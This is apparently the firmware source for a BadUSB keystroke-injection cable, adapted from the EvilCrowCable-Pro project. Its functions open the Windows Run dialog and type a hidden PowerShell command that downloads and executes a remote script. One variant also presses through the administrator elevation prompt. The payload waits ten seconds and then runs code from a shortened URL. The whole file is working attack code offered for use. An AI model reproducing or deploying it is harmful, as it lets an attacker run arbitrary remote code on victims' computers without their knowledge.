#include "exfil.h"
#include "phukd.h"

// based on https://github.com/joelsernamoreno/EvilCrowCable-Pro/tree/main/firmware, edited by @kaliiiiiiiiii

void runRemote(char *URL){
  // downloads and runs a powershell script from a url
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print(F((String("powershell -w h \"IEX(iwr('")+URL+"'))\"").c_str()));
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.press(KEY_RETURN);
};

void runRemoteAdmin(char *URL){
  // same as runRemote, but with admin privileges
  // note: this only works if user logged-in is admin and admin prompts don't require a password
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print(F((String("powershell -w h \"IEX(iwr('")+URL+"'))\"").c_str()));
  delay(100);
  Keyboard.press(129); // ctrl
  Keyboard.press(129); // shift
  Keyboard.press(KEY_RETURN); // enter
  Keyboard.releaseAll();

  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.press(KEY_RETURN);
};

void payload() {
  delay(10000); // 10 sec. delay
  runRemote("is.gd/tuioh");
}
